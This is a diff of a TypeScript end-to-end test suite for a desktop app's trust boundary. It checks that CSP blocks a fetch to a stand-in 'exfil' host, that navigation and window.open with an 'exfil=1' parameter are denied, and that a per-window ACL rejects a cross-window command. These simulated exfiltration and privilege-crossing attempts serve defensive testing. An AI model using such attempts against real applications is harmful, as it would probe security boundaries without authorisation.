@@ -148,26 +148,58 @@ describe("Trust boundary (F-012)", () => {
     });
     expect(evalOutcome).toBe("threw");
 
-    // Off-origin fetch is blocked (connect-src is ipc: only, no 'self', no remote).
-    const fetchOutcome = await browser.executeAsync((done: (r: string) => void) => {
-      fetch("https://trust-boundary-exfil.example.com/")
-        .then(() => done("reached"))
-        .catch(() => done("blocked"));
-    });
-    expect(fetchOutcome).toBe("blocked");
+    // Off-origin fetch is blocked BY CSP (connect-src is ipc: only). Assert a securitypolicyviolation whose
+    // directive is connect-src — a bare fetch rejection could also be DNS/TLS failure and prove nothing.
+    const fetchOutcome = await browser.executeAsync(
+      (done: (r: { cspBlocked: boolean }) => void) => {
+        let cspBlocked = false;
+        document.addEventListener("securitypolicyviolation", (e) => {
+          const ev = e as SecurityPolicyViolationEvent;
+          const dir = ev.effectiveDirective || ev.violatedDirective || "";
+          if (dir.includes("connect-src")) cspBlocked = true;
+        });
+        fetch("https://trust-boundary-exfil.example.com/")
+          .catch(() => {})
+          .finally(() => setTimeout(() => done({ cspBlocked }), 300));
+      },
+    );
+    expect(fetchOutcome.cspBlocked).toBe(true);
   });
 
-  it("remove_approved_origin is a REAL, mutating command from its authorized Settings window", async () => {
-    // Prove the negative-test target exists and does something — from the window that IS allowed it.
-    const res = await invokeHere("remove_approved_origin", {
-      origin: "https://not-present-benign.example.com",
+  it("blocks off-origin navigation and window.open (Rust on_navigation/on_new_window)", async () => {
+    // The nav guards are what MEDIUM-1 sharpened — assert the webview stays put and opens no window.
+    const urlBefore = await browser.getUrl();
+    const handlesBefore = (await browser.getWindowHandles()).length;
+    await browser.execute(() => {
+      try {
+        window.location.assign("https://trust-boundary-nav.example.com/?exfil=1");
+      } catch {}
+      try {
+        window.open("https://trust-boundary-nav.example.com/", "_blank");
+      } catch {}
     });
+    await browser.pause(600);
+    expect(await browser.getUrl()).toBe(urlBefore); // navigation was denied — still on the same page
+    expect((await browser.getWindowHandles()).length).toBe(handlesBefore); // no new window opened
+  });
+
+  it("set_speed is a REAL, mutating command from its authorized Settings window", async () => {
+    // Prove the cross-window target actually mutates (not a no-op) — from the window that IS allowed it.
+    const before = (readConfig().speed as string) || "full";
+    const target = before === "full" ? "balanced" : "full";
+    const res = await invokeHere("set_speed", { speed: target });
     expect(res.hasPrimitive).toBe(true);
-    expect(res.resolved).toBe(true); // real command, granted to Settings → resolves (no-op on absent origin)
+    expect(res.resolved).toBe(true);
+    expect(readConfig().speed).toBe(target); // real mutation observed in the persisted config
+    // restore
+    await invokeHere("set_speed", { speed: before });
+    expect(readConfig().speed).toBe(before);
   });
 
   it("cross-window: the auth popup is DENIED a Settings command by the ACL (isolated capability proof)", async () => {
     const before = await browser.getWindowHandles();
+    const speedBefore = (readConfig().speed as string) || "full";
+    const attackSpeed = speedBefore === "full" ? "balanced" : "full"; // a value that WOULD change state
     // Fire /prove to open a REAL auth popup (blocks until resolved / 60s timeout).
     const pending = fireProve(TEST_ORIGIN);
     try {
@@ -181,22 +213,18 @@ describe("Trust boundary (F-012)", () => {
       expect(allowed.hasPrimitive).toBe(true);
       expect(allowed.resolved).toBe(true);
 
-      // Canary: capture Settings-owned state before the forbidden attempt.
-      const originsBefore = JSON.stringify(readConfig().approved_origins ?? []);
-
-      // The attack: a Settings-only command from the auth popup. The per-window capability ACL rejects it
-      // BEFORE dispatch — so the error is the ACL's "not allowed on window …" (debug-build form), NOT the
-      // Rust caller-label "not available" message. Matching the ACL wording proves the capability layer
-      // enforces (a broken ACL that fell through to the Rust label would surface a different message).
-      const denied = await invokeHere("remove_approved_origin", { origin: TEST_ORIGIN });
+      // The attack: set_speed (a Settings-only command that WOULD mutate) from the auth popup. The per-window
+      // capability ACL rejects it BEFORE dispatch — so the error is the ACL's "not allowed on window …"
+      // (debug-build form), NOT the Rust caller-label "not available" message. Matching the ACL wording
+      // proves the capability layer enforces (a broken ACL that fell through to the Rust label would differ).
+      const denied = await invokeHere("set_speed", { speed: attackSpeed });
       expect(denied.hasPrimitive).toBe(true); // not a spurious pass from a missing primitive
       expect(denied.resolved).toBe(false);
       expect(denied.error ?? "").toContain("not allowed"); // ACL reason, not the Rust label reason
       expect(denied.error ?? "").not.toContain("not available from this window"); // would mean ACL fell through
 
-      // State canary: the denied call executed nothing.
-      const originsAfter = JSON.stringify(readConfig().approved_origins ?? []);
-      expect(originsAfter).toBe(originsBefore);
+      // Strong canary: had the call executed, speed would now be attackSpeed. It must be unchanged.
+      expect(readConfig().speed).toBe(speedBefore);
 
       // Resolve the popup (Deny) so the pending /prove returns and the window closes.
       if (IS_LINUX) {
